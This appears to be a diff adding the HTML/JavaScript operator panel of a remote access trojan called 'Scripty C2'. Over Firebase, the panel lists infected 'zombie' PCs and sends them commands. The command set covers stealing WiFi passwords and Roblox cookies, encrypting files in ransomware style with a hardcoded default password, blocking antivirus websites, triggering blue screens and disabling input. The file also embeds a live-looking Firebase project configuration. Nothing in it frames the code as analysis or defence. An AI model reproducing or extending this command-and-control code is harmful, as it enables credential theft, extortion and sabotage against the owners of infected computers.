@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SCRITPY C2 PANEL</title>
+    <style>
+        :root {
+            --bg-term: #0a0a0a;
+            --text-term: #0eff00;
+            --glow: rgba(14, 255, 0, 0.3);
+            --font-term: 'Courier New', monospace;
+            --dim: #1a1a1a;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            background-color: #000;
+            overflow: hidden;
+            font-family: var(--font-term);
+        }
+
+        /* LEFT SIDE: TERMINAL (30%) */
+        .terminal-panel {
+            width: 30%;
+            min-width: 380px;
+            background: linear-gradient(135deg, #0a0a0a 0%, #0f0f0f 100%);
+            color: var(--text-term);
+            display: flex;
+            flex-direction: column;
+            border-right: 2px solid #1a3a1a;
+            padding: 15px;
+            box-shadow: 
+                inset 0 0 20px rgba(0, 0, 0, 0.8),
+                10px 0 30px rgba(0, 0, 0, 0.7),
+                0 0 40px var(--glow);
+            z-index: 10;
+            position: relative;
+        }
+
+        /* GLOW LINES EFFECT */
+        .terminal-panel::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                repeating-linear-gradient(
+                    0deg,
+                    rgba(14, 255, 0, 0.02) 0px,
+                    rgba(14, 255, 0, 0.02) 1px,
+                    transparent 1px,
+                    transparent 2px
+                );
+            pointer-events: none;
+            border-radius: 0;
+        }
+
+        /* RIGHT SIDE: IMAGE (70%) */
+        .image-panel {
+            flex-grow: 1;
+            background: linear-gradient(135deg, #1a1a1a 0%, #0f0f0f 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* FADE OVERLAY (Left to Right) */
+        .fade-overlay {
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(
+                to right,
+                #0a0a0a 0%,
+                rgba(10, 10, 10, 0.7) 15%,
+                rgba(10, 10, 10, 0.3) 30%,
+                transparent 60%
+            );
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .scripty-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            object-position: right center;
+            position: absolute;
+            top: 0; left: 0;
+            filter: contrast(110%);
+            z-index: 1;
+        }
+
+        /* WATERMARK */
+        .watermark {
+            position: absolute;
+            top: 30px;
+            right: 40px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #0eff00;
+            font-size: 1.8rem;
+            text-shadow: 
+                0 0 10px rgba(14, 255, 0, 0.6),
+                2px 2px 4px rgba(0, 0, 0, 0.8);
+            z-index: 5;
+            letter-spacing: 2px;
+        }
+
+        /* TERMINAL HEADER */
+        .term-header {
+            border-bottom: 1px solid #1a3a1a;
+            padding-bottom: 8px;
+            margin-bottom: 12px;
+            font-size: 0.75rem;
+            color: #0eff00;
+            display: flex;
+            justify-content: space-between;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+            position: relative;
+            z-index: 1;
+        }
+
+        #connStatus {
+            color: #ff3333;
+            text-shadow: 0 0 8px rgba(255, 51, 51, 0.6);
+        }
+
+        #connStatus.online {
+            color: #0eff00;
+            text-shadow: 0 0 8px rgba(14, 255, 0, 0.6);
+        }
+
+        /* TERMINAL OUTPUT */
+        #terminalOutput {
+            flex-grow: 1;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            padding: 8px 5px;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 0 3px rgba(14, 255, 0, 0.2);
+        }
+
+        /* INPUT SECTION */
+        .input-area {
+            border-top: 1px solid #1a3a1a;
+            padding-top: 8px;
+            display: flex;
+            align-items: center;
+            background: rgba(10, 10, 10, 0.5);
+            border-radius: 4px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .prompt {
+            color: var(--text-term);
+            margin-right: 6px;
+            font-weight: bold;
+            text-shadow: 0 0 5px var(--glow);
+        }
+
+        input {
+            background: transparent;
+            border: none;
+            color: var(--text-term);
+            font-family: var(--font-term);
+            font-size: 0.9rem;
+            flex-grow: 1;
+            outline: none;
+            text-shadow: 0 0 3px var(--glow);
+        }
+
+        input::placeholder { color: #1a3a1a; }
+
+        /* SCROLLBAR CUSTOM */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(180deg, #0eff00, #00aa00);
+            border-radius: 3px;
+            box-shadow: 0 0 8px rgba(14, 255, 0, 0.4);
+        }
+
+        /* LOG COLORS */
+        .log-sys {
+            color: #00ffff;
+            text-shadow: 0 0 5px rgba(0, 255, 255, 0.3);
+        }
+
+        .log-err {
+            color: #ff3333;
+            text-shadow: 0 0 5px rgba(255, 51, 51, 0.3);
+        }
+
+        .log-warn {
+            color: #ffcc00;
+            text-shadow: 0 0 5px rgba(255, 204, 0, 0.2);
+        }
+
+        .log-info { color: #666; }
+
+        .log-cmd { color: var(--text-term); }
+
+        .log-num {
+            color: #0eff00;
+            font-weight: bold;
+        }
+
+        /* AUTH OVERLAY */
+        #authOverlay {
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: #000;
+            color: var(--text-term);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.4rem;
+            z-index: 9999;
+            text-shadow: 0 0 10px var(--glow);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- AUTH LOADER -->
+    <div id="authOverlay">▓ AUTHENTICATING ADMIN ▓</div>
+
+    <!-- LEFT: TERMINAL -->
+    <div class="terminal-panel">
+        <div class="term-header">
+            <span>ROOT@SCRIPTY-C2</span>
+            <span id="connStatus">⬤ OFFLINE</span>
+        </div>
+        
+        <div id="terminalOutput">
+            <div class="log-info">System initializing...</div>
+        </div>
+
+        <div class="input-area">
+            <span class="prompt" id="promptText">></span>
+            <input type="text" id="cmdInput" autocomplete="off" spellcheck="false" autofocus placeholder="Enter command...">
+        </div>
+    </div>
+
+    <!-- RIGHT: IMAGE AREA -->
+    <div class="image-panel">
+        <div class="fade-overlay"></div>
+        <div class="watermark">Scripty C2</div>
+        <img src="image.jpg" alt="C2 Graphic" class="scripty-img">
+    </div>
+
+    <!-- LOGIC -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+        import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // CONFIG
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
+            authDomain: "potkan-5132c.firebaseapp.com",
+            databaseURL: "https://potkan-5132c-default-rtdb.firebaseio.com/",
+            projectId: "potkan-5132c",
+            storageBucket: "potkan-5132c.firebasestorage.app",
+            messagingSenderId: "1.049909900706e+12",
+            appId: "1:1.049909900706e+12:web:f4d5b811a98760f0862efb"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app); 
+        const db = getDatabase(app);
+        const ADMIN_UID = "sJSL8EjvFhMpoiD4yaAThWDKsf32"; 
+
+        // STATE
+        let currentTargetID = null;
+        let currentTargetName = "NONE";
+        let pcList = {};
+        let pcArray = [];
+
+        // DOM
+        const termOut = document.getElementById('terminalOutput');
+        const cmdInput = document.getElementById('cmdInput');
+        const promptTxt = document.getElementById('promptText');
+        const statusEl = document.getElementById('connStatus');
+        const overlay = document.getElementById('authOverlay');
+
+        // AUTH
+        onAuthStateChanged(auth, (user) => {
+            if (user && user.uid === ADMIN_UID) {
+                overlay.style.display = "none";
+                statusEl.innerHTML = "⬤ ONLINE";
+                statusEl.classList.add("online");
+                print(`ADMIN AUTHENTICATED: ${user.email}`, "log-sys");
+                print("", "log-info");
+                print("Type '!help' for commands", "log-info");
+                loadTargets();
+            } else {
+                overlay.innerHTML = "⬚ ACCESS DENIED ⬚";
+                setTimeout(() => window.location.href = "login.html", 2500);
+            }
+        });
+
+        // INPUT
+        cmdInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const val = cmdInput.value.trim();
+                if (val) {
+                    print(`${promptTxt.innerText} ${val}`, "log-cmd");
+                    runCmd(val);
+                }
+                cmdInput.value = '';
+                setTimeout(() => termOut.scrollTop = termOut.scrollHeight, 10);
+            }
+        });
+
+        document.body.addEventListener('click', () => cmdInput.focus());
+
+        function print(msg, type = "log-cmd") {
+            const d = document.createElement('div');
+            d.className = type;
+            d.innerText = msg;
+            termOut.appendChild(d);
+            termOut.scrollTop = termOut.scrollHeight;
+        }
+
+        // TARGETS
+        function loadTargets() {
+            get(child(ref(db), `discord_structure`)).then((snapshot) => {
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    pcList = data.structure || data;
+                    buildPCArray();
+                    print("Database loaded.", "log-info");
+                }
+            });
+        }
+
+        // BUILD NUMBERED PC ARRAY
+        function buildPCArray() {
+            pcArray = [];
+            for (const [srv, cats] of Object.entries(pcList)) {
+                if(srv === "last_updated") continue;
+                for(const [pc, chans] of Object.entries(cats)) {
+                    pcArray.push({ name: pc, channels: chans, server: srv });
+                }
+            }
+        }
+
+        // COMMANDS
+        function runCmd(raw) {
+            const parts = raw.split(" ");
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1).join(" ");
+
+            if(cmd === 'clear') { termOut.innerHTML = ''; return; }
+            
+            if(cmd === '!help') {
+                print(`
+╔═══════════════════════════════════╗
+║       SCRIPTY C2 COMMANDS         ║
+╚═══════════════════════════════════╝
+
+TARGET CONTROL:
+  !list              - Show Zombies (Numbered)
+  !control <ID>      - Hook PC by Number
+  !status            - Current Info
+
+⚡ POWER CONTROL:
+  !lock              - Lock PC
+  !restart           - Restart System
+  !shutdown          - Shutdown PC
+  !bsod              - Blue Screen of Death
+  !blockinput        - Disable Keyboard/Mouse
+  !freeinput         - Enable Keyboard/Mouse
+  !blockscreen       - Block Screen Output
+
+🛡️ SECURITY:
+  !blockav           - Block AV Websites
+  !unblockav         - Unblock AV Websites
+  !checkadmin        - Check Admin Status
+  !setcritical       - Make Process Critical
+  !unsetcritical     - Remove Critical Status
+  !hidetaskbar       - Hide Taskbar
+  !showtaskbar       - Show Taskbar
+
+🕵️ STEALERS:
+  !wifi              - Steal WiFi Passwords
+  !roblox            - Grab Roblox Cookie
+
+🔐 ENCRYPTION:
+  !encrypt <pass>    - Force Encrypt Files
+  !decrypt <pass>    - Decrypt Files
+
+🔊 MEDIA:
+  !tts <text>        - Text to Speech
+  !msgbox <msg>      - Popup Message
+  !url <link>        - Open Website
+  !mute              - Mute Audio
+  !unmute            - Unmute Audio
+  !volume <0-100>    - Set Volume
+
+👻 FUN:
+  !jumpscare         - Jumpscare Screen
+  !blacklist <app>   - Kill Process
+  !whitelist <app>   - Restore Process
+                `, "log-sys");
+                return;
+            }
+
+            if(cmd === '!list') {
+                print("━━━ ACTIVE ZOMBIES ━━━", "log-warn");
+                if(pcArray.length === 0) {
+                    print("No targets found.", "log-err");
+                    return;
+                }
+                pcArray.forEach((pc, idx) => {
+                    print(`  [${idx + 1}] ${pc.name}`, "log-num");
+                });
+                print("Use: !control <number>", "log-info");
+                return;
+            }
+
+            if(cmd === '!control') {
+                if(!args) return print("Usage: !control <number>", "log-err");
+                
+                const idx = parseInt(args) - 1;
+                if(isNaN(idx) || idx < 0 || idx >= pcArray.length) {
+                    return print(`✗ Invalid ID. Use 1-${pcArray.length}`, "log-err");
+                }
+
+                const selected = pcArray[idx];
+                const names = ["remote-access", "𝕣𝕖𝕞𝕠𝕥𝕖-𝕒𝕔𝕔𝕖𝕤𝕤", "cmd", "terminal"];
+                let cid = null;
+
+                for(const [id, n] of Object.entries(selected.channels)) {
+                    if(names.includes(n.toLowerCase())) { cid = id; break; }
+                }
+
+                if(cid) {
+                    currentTargetID = cid;
+                    currentTargetName = selected.name;
+                    promptTxt.innerText = `${selected.name}#`;
+                    print(`✓ Connected to ${selected.name} (${selected.server})`, "log-sys");
+                } else {
+                    print(`✗ Cannot find channel in ${selected.name}`, "log-err");
+                }
+                return;
+            }
+
+            if(cmd === '!status') {
+                print(`Current Target: ${currentTargetName}`, "log-sys");
+                print(`Session ID: ${currentTargetID || "DISCONNECTED"}`, "log-sys");
+                return;
+            }
+
+            if(!currentTargetID) return print("✗ No target. Use !control first.", "log-err");
+
+            let pl = { target_id: currentTargetID };
+
+            switch(cmd) {
+                // POWER COMMANDS
+                case '!lock': pl.type='lock_pc'; break;
+                case '!restart': pl.type='restart_pc'; break;
+                case '!shutdown': pl.type='shutdown_pc'; break;
+                case '!bsod': pl.type='bsod'; break;
+                case '!blockinput': pl.type='disable_input'; break;
+                case '!freeinput': pl.type='enable_input'; break;
+                case '!blockscreen': pl.type='block_screen'; break;
+
+                // SECURITY
+                case '!blockav': pl.type='block_av_sites'; break;
+                case '!unblockav': pl.type='unblock_av_sites'; break;
+                case '!checkadmin': pl.type='check_admin'; break;
+                case '!setcritical': pl.type='set_critical'; break;
+                case '!unsetcritical': pl.type='unset_critical'; break;
+                case '!hidetaskbar': pl.type='hide_taskbar'; break;
+                case '!showtaskbar': pl.type='show_taskbar'; break;
+
+                // STEALERS
+                case '!wifi': pl.type='wifi_stealer'; break;
+                case '!roblox': pl.type='grab_roblox'; break;
+
+                // ENCRYPTION
+                case '!encrypt': pl.type='force_encrypt'; pl.password=args||"scripty_rat_best_777"; break;
+                case '!decrypt': pl.type='decrypt_files'; pl.password=args; break;
+
+                // MEDIA
+                case '!tts': pl.type='tts'; pl.text=args; break;
+                case '!msgbox': pl.type='msgbox'; pl.text=args; break;
+                case '!url': pl.type='open_url'; pl.url=args; break;
+                case '!mute': pl.type='mute'; break;
+                case '!unmute': pl.type='unmute'; break;
+                case '!volume': pl.type='volume'; pl.value=args; break;
+
+                // FUN
+                case '!jumpscare': pl.type='jumpscare'; break;
+                case '!blacklist': pl.type='blacklist'; pl.name=args; break;
+                case '!whitelist': pl.type='whitelist'; pl.name=args; break;
+
+                default: return print("✗ Unknown command", "log-err");
+            }
+
+            sendPayload(pl);
+        }
+
+        function sendPayload(data) {
+            data.timestamp = Date.now();
+            set(ref(db, 'queue/pending'), data)
+                .then(() => print(`✓ Payload sent: ${data.type}`, "log-sys"))
+                .catch(e => print(`✗ Error: ${e}`, "log-err"));
+        }
+
+        // LOGS
+        const logs = query(ref(db, 'logs'), limitToLast(1));
+        onValue(logs, (snap) => {
+            if(snap.exists()) {
+                const val = Object.values(snap.val())[0];
+                if(Date.now() - val.timestamp < 2000) print(`→ ${val.message}`, "log-info");
+            }
+        });
+
+    </script>
+</body>
+</html>
